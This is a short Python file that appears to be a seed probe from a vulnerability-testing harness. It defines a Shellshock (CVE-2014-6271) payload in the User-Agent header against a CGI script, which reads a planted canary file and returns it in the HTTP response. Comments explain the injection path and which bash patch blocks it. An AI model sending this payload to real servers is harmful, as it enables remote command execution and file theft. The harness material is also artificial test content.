#!/usr/bin/env python3
"""[GIVEN] CVE-2014-6271 (Shellshock) seed exploit — delivered the real-world way.

An EXTERNAL HTTP request carries a malicious `User-Agent` header. Apache mod_cgi
maps it into the CGI process environment as HTTP_USER_AGENT and execs the version's
REAL bash to run the CGI script. On pre-fix bash the classic function-import
injection `() { :;}; <cmd>` runs the trailing command while importing the
environment: here it emits a CGI header block and the canary, so the planted flag
surfaces directly in the HTTP response body. bash43-025 (V1) neutralises this exact
trailing-command path, so the seed is BLOCKED on V1.
"""


def candidate():
    return {
        "probe_id": "cve-2014-6271-seed",
        "header": "User-Agent",
        # Function def + trailing commands. They run at bash startup (during env-var
        # function import) and emit a valid CGI header block then the canary, read
        # via the `$(<file)` builtin (a pure-bash read, no forked external command —
        # the pre-Shellshock v0 build segfaults if the trailing path forks `cat`,
        # and Apache would drop a signal-killed CGI's output). `exit 0` flushes and
        # exits cleanly so Apache returns the flag in the response body.
        # bash43-025 (V1) blocks this whole trailing-command path.
        "value": '() { :;}; printf "Content-Type: text/plain\\n\\n"; printf "%s\\n" "$(</canary)"; exit 0',
        "path": "/cgi-bin/status.cgi",
        # 6271 surfaces the flag directly in the HTTP response body; no file fetch.
        "leak_path": None,
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
